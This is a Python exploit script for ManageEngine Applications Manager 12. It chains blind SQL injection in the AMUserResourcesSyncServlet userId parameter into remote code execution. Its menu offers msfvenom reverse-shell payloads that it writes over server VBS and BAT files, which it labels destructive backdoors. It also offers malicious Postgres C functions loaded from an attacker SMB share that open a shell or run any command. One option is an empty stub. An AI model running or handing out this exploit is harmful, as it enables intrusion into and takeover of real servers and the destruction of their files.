#!/usr/env/python3
import requests
import argparse
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from subprocess import Popen, PIPE
import re

def checkAlive(url):

    try:
        res = requests.get(url, verify=False, timeout=10)
        if res.elapsed.total_seconds() > 3:
            print("[!] Your connection to the server seems unstable. The exploit may have trouble executing...")
        if res.elapsed.total_seconds() == 10:
            print("[!] Unable to contact server.")
            exit()
    except:
        print("[-] Unable to contact server. Exiting program...")

    return

def checkAdmin(url):

    print("[?] Checking if Postgres user is admin...")

    test = url + "/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(4)+end;--"
    res = requests.get(test, verify=False)

    if res.elapsed.total_seconds() >= 4:
        print("[+] Postgres user is likely database admin.")
    else:
        print("[-] Postgres user is likely NOT database admin. Advanced injection not possible.")
        print("// The database contents may still be dumped for credentials. Try SQLmap.")
        exit()

    return

def writeVBS(url,lhost,lport):
    
    print("[~] Crafting VBS payload with msfvenom...")

    craft = Popen(["msfvenom","-p", "windows/x64/shell_reverse_tcp", f"LHOST={lhost}",  f"LPORT={lport}","-f", "vbs"], stdout=PIPE, stderr=PIPE)
    stdout, stderr = craft.communicate()
    payload = stdout.decode('utf-8')
    payload = fr"{payload}"
    payload = re.sub(r'_.*?\n','',f"{payload}")
    payload = re.sub(r'\t','',f"{payload}")
    payload = re.sub(r'\r',':',f"{payload}")
    payload = re.sub(r'\n',':',f"{payload}")
    payload = re.sub(r'::',':',f"{payload}")

    encoded = payload.encode("utf-8")
    encoded = base64.b64encode(encoded)
    encoded = encoded.decode("utf-8")

    print("[~] Injecting VBS payload...")

    postData = {
        "ForMasRange" : 1,
        "userId" : f"1; COPY (SELECT convert_from(decode($${encoded}$$,$$base64$$),$$UTF8$$)) to $$C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\wmiget.vbs$$;--"
    }

    injection = url + "/servlet/AMUserResourcesSyncServlet"
    res = requests.post(injection, verify=False, data=postData)

    print("[+] Payload injected. Wait for trigger on listener.")

    return

def writeBAT(url,lhost,lport):

    print("[~] Crafting BAT payload with msfvenom...")

    craft = Popen(["msfvenom","-p", "windows/x64/shell_reverse_tcp", f"LHOST={lhost}",  f"LPORT={lport}","-f", "psh-cmd"], stdout=PIPE, stderr=PIPE)
    stdout, stderr = craft.communicate()
    payload = stdout.decode('utf-8')

    encoded = payload.encode("utf-8")
    encoded = base64.b64encode(encoded)
    encoded = encoded.decode("utf-8")

    print("[~] Injecting BAT payload...")

    postData = {
        "ForMasRange" : 1,
        "userId" : f"1; COPY (SELECT convert_from(decode($${encoded}$$,$$base64$$),$$UTF8$$)) to $$C:\\Program Files (x86)\\ManageEngine\\AppManager12\\StartApplicationsManager.bat$$;--"
    }

    injection = url + "/servlet/AMUserResourcesSyncServlet"
    res = requests.post(injection, verify=False, data=postData)

    print("[+] Payload injected. Trigger will fire on Application Manager startup.")

    return

def udfShell(url,lhost,lport):

    print("[~] Starting SMB server with Impacket...")

    craft = Popen(["impacket-smbserver","-smb2support","inject","."], stdout=PIPE, stderr=PIPE)

    print("[~] Creating malicious UDF...")

    postData = {
        "ForMasRange" : 1,
        "userId" : f"1; CREATE OR REPLACE FUNCTION shell(text, integer) RETURNS void AS $$\\\\{lhost}\\inject\\connect_back.dll$$, $$connect_back$$ LANGUAGE C STRICT;--"
    }

    injection = url + "/servlet/AMUserResourcesSyncServlet"
    res = requests.post(injection, verify=False, data=postData)

    print("[~] Triggering UDF...")

    postData = {
        "ForMasRange" : 1,
        "userId" : f"1; SELECT shell($${lhost}$$, {lport});--"
    }

    injection = url + "/servlet/AMUserResourcesSyncServlet"
    res = requests.post(injection, verify=False, data=postData)

    print("[+] UDF triggered. Enjoy the shell!")

    return

def udfProcess(url,lhost,lport):

    process = input("[?] This option requires you to specify the process (or command) to execute: ")

    print("[~] Starting SMB server with Impacket...")

    craft = Popen(["impacket-smbserver","-smb2support","inject","."], stdout=PIPE, stderr=PIPE)

    print("[~] Creating malicious UDF...")

    postData = {
        "ForMasRange" : 1,
        "userId" : f"1; CREATE OR REPLACE FUNCTION spawn(text, integer) RETURNS void AS $$\\\\{lhost}\\inject\\pgsql_process.dll$$, $$awae$$ LANGUAGE C STRICT;--"
    }

    injection = url + "/servlet/AMUserResourcesSyncServlet"
    res = requests.post(injection, verify=False, data=postData)

    print("[~] Triggering UDF...")

    postData = {
        "ForMasRange" : 1,
        "userId" : f"1; SELECT spawn($${process}$$, 1);--"
    }

    injection = url + "/servlet/AMUserResourcesSyncServlet"
    res = requests.post(injection, verify=False, data=postData)

    print("[+] UDF triggered. Process opened.")

    return

def udfLargeShell(url,lhost,lport):



    return


def main():
    
    print("[*] ManageEngine Applications Manager 12 SQLi RCE [*]")
    print("// This exploit relies on time-based blind SQL injection which is inherently impacted by connection performance.\n")

    # Parser
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="Base URL of ManageEngine server", type=str)
    parser.add_argument("lhost", help="Local IP for listener", type=str)
    parser.add_argument("lport", help="Local port for listener", type=str)
    args = parser.parse_args()

    checkAlive(args.url)
    checkAdmin(args.url)
    print("\n[?] Select exploit method: \n")
    print("1. Large Object UDF Shell\n")
    print("// REQUIRES SMB CONNECTION")
    print("2. SMB UDF Shell")
    print("3. SMB UDF Process\n")
    print("// DESTRUCTIVE BACKDOORS")
    print("4. VBS injection")
    print("5. BAT injection\n")
    c = 0
    while c not in [1,2,3,4,5]:
        c = int(input("Exploit method:  "))

    match c:
        case 1:
            udfLargeShell(args.url,args.lhost,args.lport)
        case 2:
            udfShell(args.url,args.lhost,args.lport)
        case 3:
            udfProcess(args.url,args.lhost,args.lport)
        case 4:
            writeVBS(args.url,args.lhost,args.lport)
        case 5:
            writeBAT(args.url,args.lhost,args.lport)

    return

if __name__ == '__main__':
    main()